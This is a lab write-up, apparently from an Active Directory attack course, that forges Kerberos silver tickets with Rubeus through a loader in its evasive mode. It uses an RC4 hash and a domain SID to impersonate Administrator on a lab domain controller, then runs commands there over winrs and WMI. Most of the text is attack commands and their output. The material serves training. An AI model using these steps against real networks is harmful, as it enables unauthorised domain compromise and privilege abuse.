# LEARNING OBJECTIVE 9

## Try to get command execution on the domain controller by creating silver ticket for HTTP AND WMI
### HTTP

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt

######

[+] Ticket successfully imported!
```
Check if correct:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist

######

Server Name       : http/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
	Client Name       : Administrator @ DOLLARCORP.MONEYCORP.LOCAL
      Flags             : pre_authent, renewable, forwardable (40a00000)

######
```
Now HTTP service ticket accessible:
```
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
```

### WMI

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
Check:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist

######

Start/End/MaxRenew: 1/2/2025 2:27:09 AM ; 1/2/2025 12:27:09 PM ; 1/9/2025 2:27:09 AM
Server Name       : rpcss/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
Client Name       : Administrator @ DOLLARCORP.MONEYCORP.LOCAL
Flags             : pre_authent, renewable, forwardable (40a00000)

[1] - 0x17 - rc4_hmac
Start/End/MaxRenew: 1/2/2025 2:26:55 AM ; 1/2/2025 12:26:55 PM ; 1/9/2025 2:26:55 AM
Server Name       : host/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
Client Name       : Administrator @ DOLLARCORP.MONEYCORP.LOCAL
Flags             : pre_authent, renewable, forwardable (40a00000) [snip]

######
```

Try running WMI:
```
C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
[snip]
PS C:\AD\Tools> Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348
```
